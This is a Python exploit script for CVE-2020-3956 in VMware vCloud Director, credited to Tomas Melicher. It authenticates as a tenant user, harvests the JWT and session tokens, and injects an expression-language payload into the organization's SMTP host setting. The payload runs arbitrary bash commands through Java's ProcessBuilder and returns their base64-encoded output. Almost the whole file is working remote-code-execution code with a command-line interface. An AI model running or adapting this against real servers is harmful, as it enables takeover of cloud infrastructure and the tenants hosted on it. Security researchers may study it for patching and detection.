# Exploit Title: vCloud Director - Remote Code Execution
# Exploit Author: Tomas Melicher
# Technical Details: https://citadelo.com/en/blog/full-infrastructure-takeover-of-vmware-cloud-director-CVE-2020-3956/
# Date: 2020-05-24
# Vendor Homepage: https://www.vmware.com/
# Software Link: https://www.vmware.com/products/cloud-director.html
# Tested On: vCloud Director 9.7.0.15498291
# Vulnerability Description: 

import argparse # pip install argparse
import base64, os, re, requests, sys
if sys.version_info >= (3, 0):
    from urllib.parse import urlparse
else:
    from urlparse import urlparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

PAYLOAD_TEMPLATE = "${&#039;&#039;.getClass().forName(&#039;java.io.BufferedReader&#039;).getDeclaredConstructors()[1].newInstance(&#039;&#039;.getClass().forName(&#039;java.io.InputStreamReader&#039;).getDeclaredConstructors()[3].newInstance(&#039;&#039;.getClass().forName(&#039;java.lang.ProcessBuilder&#039;).getDeclaredConstructors()[0].newInstance([&#039;bash&#039;,&#039;-c&#039;,&#039;echo COMMAND|base64 -di|bash|base64 -w 0&#039;]).start().getInputStream())).readLine()}"
session = requests.Session()

def login(url, username, password, verbose):
	target_url = &#039;%s://%s%s&#039;%(url.scheme, url.netloc, url.path)
	res = session.get(target_url)
	match = re.search(r&#039;tenant:([^"]+)&#039;, res.content, re.IGNORECASE)
	if match:
		tenant = match.group(1)
	else:
		print(&#039;[!] can\&#039;t find tenant identifier&#039;)
		return (None,None,None,None)

	if verbose:
		print(&#039;[*] tenant: %s&#039;%(tenant))

	match = re.search(r&#039;security_check\?[^"]+&#039;, res.content, re.IGNORECASE)
	if match:																			# Cloud Director 9.*
		login_url = &#039;%s://%s/login/%s&#039;%(url.scheme, url.netloc, match.group(0))
		res = session.post(login_url, data={&#039;username&#039;:username,&#039;password&#039;:password})
		if res.status_code == 401:
			print(&#039;[!] invalid credentials&#039;)
			return (None,None,None,None)
	else:																				# Cloud Director 10.*
		match = re.search(r&#039;/cloudapi/.*/sessions&#039;, res.content, re.IGNORECASE)
		if match:
			login_url = &#039;%s://%s%s&#039;%(url.scheme, url.netloc, match.group(0))
			headers = {
				&#039;Authorization&#039;: &#039;Basic %s&#039;%(base64.b64encode(&#039;%s@%s:%s&#039;%(username,tenant,password))),
				&#039;Accept&#039;: &#039;application/json;version=29.0&#039;,
				&#039;Content-type&#039;: &#039;application/json;version=29.0&#039;
			}
			res = session.post(login_url, headers=headers)
			if res.status_code == 401:
				print(&#039;[!] invalid credentials&#039;)
				return (None,None,None,None)
		else:
			print(&#039;[!] url for login form was not found&#039;)
			return (None,None,None,None)

	cookies = session.cookies.get_dict()
	jwt = cookies[&#039;vcloud_jwt&#039;]
	session_id = cookies[&#039;vcloud_session_id&#039;]

	if verbose:
		print(&#039;[*] jwt token: %s&#039;%(jwt))
		print(&#039;[*] session_id: %s&#039;%(session_id))

	res = session.get(target_url)
	match = re.search(r&#039;organization : \&#039;([^\&#039;]+)&#039;, res.content, re.IGNORECASE)
	if match is None:
		print(&#039;[!] organization not found&#039;)
		return (None,None,None,None)
	organization = match.group(1)
	if verbose:
		print(&#039;[*] organization name: %s&#039;%(organization))

	match = re.search(r&#039;orgId : \&#039;([^\&#039;]+)&#039;, res.content)
	if match is None:
		print(&#039;[!] orgId not found&#039;)
		return (None,None,None,None)
	org_id = match.group(1)
	if verbose:
		print(&#039;[*] organization identifier: %s&#039;%(org_id))

	return (jwt,session_id,organization,org_id)


def exploit(url, username, password, command, verbose):
	(jwt,session_id,organization,org_id) = login(url, username, password, verbose)
	if jwt is None:
		return

	headers = {
		&#039;Accept&#039;: &#039;application/*+xml;version=29.0&#039;,
		&#039;Authorization&#039;: &#039;Bearer %s&#039;%jwt,
		&#039;x-vcloud-authorization&#039;: session_id
	}
	admin_url = &#039;%s://%s/api/admin/&#039;%(url.scheme, url.netloc)
	res = session.get(admin_url, headers=headers)
	match = re.search(r&#039;<description>\s*([^<\s]+)&#039;, res.content, re.IGNORECASE)
	if match:
		version = match.group(1)
		if verbose:
			print(&#039;[*] detected version of Cloud Director: %s&#039;%(version))
	else:
		version = None
		print(&#039;[!] can\&#039;t find version of Cloud Director, assuming it is more than 10.0&#039;)

	email_settings_url = &#039;%s://%s/api/admin/org/%s/settings/email&#039;%(url.scheme, url.netloc, org_id)

	payload = PAYLOAD_TEMPLATE.replace(&#039;COMMAND&#039;, base64.b64encode(&#039;(%s) 2>&1&#039;%command))
	data = &#039;<root:OrgEmailSettings xmlns:root="http://www.vmware.com/vcloud/v1.5"><root:IsDefaultSmtpServer>false</root:IsDefaultSmtpServer>&#039;
	data += &#039;<root:IsDefaultOrgEmail>true</root:IsDefaultOrgEmail><root:FromEmailAddress/><root:DefaultSubjectPrefix/>&#039;
	data += &#039;<root:IsAlertEmailToAllAdmins>true</root:IsAlertEmailToAllAdmins><root:AlertEmailTo/><root:SmtpServerSettings>&#039;
	data += &#039;<root:IsUseAuthentication>false</root:IsUseAuthentication><root:Host>%s</root:Host><root:Port>25</root:Port>&#039;%(payload)
	data += &#039;<root:Username/><root:Password/></root:SmtpServerSettings></root:OrgEmailSettings>&#039;
	res = session.put(email_settings_url, data=data, headers=headers)
	match = re.search(r&#039;value:\s*\[([^\]]+)\]&#039;, res.content)

	if verbose:
		print(&#039;&#039;)
	try:
		print(base64.b64decode(match.group(1)))
	except Exception:
		print(res.content)


parser = argparse.ArgumentParser(usage=&#039;%(prog)s -t target -u username -p password [-c command] [--check]&#039;)
parser.add_argument(&#039;-v&#039;, action=&#039;store_true&#039;)
parser.add_argument(&#039;-t&#039;, metavar=&#039;target&#039;, help=&#039;url to html5 client (http://example.com/tenant/my_company)&#039;, required=True)
parser.add_argument(&#039;-u&#039;, metavar=&#039;username&#039;, required=True)
parser.add_argument(&#039;-p&#039;, metavar=&#039;password&#039;, required=True)
parser.add_argument(&#039;-c&#039;, metavar=&#039;command&#039;, help=&#039;command to execute&#039;, default=&#039;id&#039;)
args = parser.parse_args()

url = urlparse(args.t)
exploit(url, args.u, args.p, args.c, args.v)

